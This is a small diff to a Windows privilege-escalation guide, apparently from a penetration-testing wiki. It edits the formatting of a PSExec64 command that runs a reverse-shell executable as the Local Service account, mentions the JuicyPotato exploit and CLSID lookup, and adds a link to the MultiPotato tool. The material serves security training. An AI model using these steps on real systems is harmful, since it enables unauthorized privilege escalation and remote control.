@@ -44,7 +44,7 @@ Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows and
 
 Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:
 
-```
+```powershell
 PSExec64.exe -i -u "ntauthority\local service" reverse.exe
 ```
 
@@ -63,3 +63,7 @@ If the CLSID ({03ca...) doesn’t work for you, either check this list:
 
 or run the GetCLSID.ps1 PowerShell script.
 {% endhint %}
+
+## MultiPotato
+
+{% embed url="https://github.com/S3cur3Th1sSh1t/MultiPotato" %}
